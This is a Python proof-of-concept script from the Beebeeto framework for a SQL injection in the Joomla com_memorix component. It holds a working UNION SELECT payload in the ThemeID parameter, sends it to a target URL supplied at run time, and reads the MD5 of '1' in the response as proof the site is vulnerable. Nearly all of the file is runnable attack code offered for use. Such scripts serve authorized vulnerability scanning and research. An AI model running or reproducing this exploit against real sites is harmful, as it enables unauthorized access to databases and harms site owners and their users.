#!/usr/bin/env python
# encoding: utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info={
            # poc相关信息
            'poc': {
                'id': 'poc-2015-0138',
                'name': 'Joomla /index.php com_memorix SQL 注入漏洞 PoC',
                'author': 'cflq3',
                'create_date': '2015-09-12',
            },
            # 协议相关信息
            'protocol': {
                'name': 'http',
                'port': [80],
                'layer4_protocol': ['tcp'],
            },
            # 漏洞相关信息
            'vul': {
                'app_name': 'Joomla',
                'vul_version': ['*'],
                'type': 'SQL Injection',
                'tag': ['joomla 漏洞', 'com_memorix', 'sql injection'],
                'desc': 'Joomla com_memorix component sql injection',
                'references': ['https://www.exploit-db.com/exploits/37773/'],
            },
    }

    @classmethod
    def verify(cls, args):
        payload = ('/index.php?option=com_memorix&task=result&searchplugin=theme&'
                   'Itemid=60&ThemeID=-8594+union+select+111,222,MD5(1),444,555,66'
                   '6,777,888,999--+AbuHassan')
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*]Request URL:' + verify_url
        req = urllib2.urlopen(verify_url)
        content = req.read()
        if 'c4ca4238a0b923820dcc509a6f75849b' in content:
            args['success']=True
            args['poc_ret']['vul_url']=args['options']['target']
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())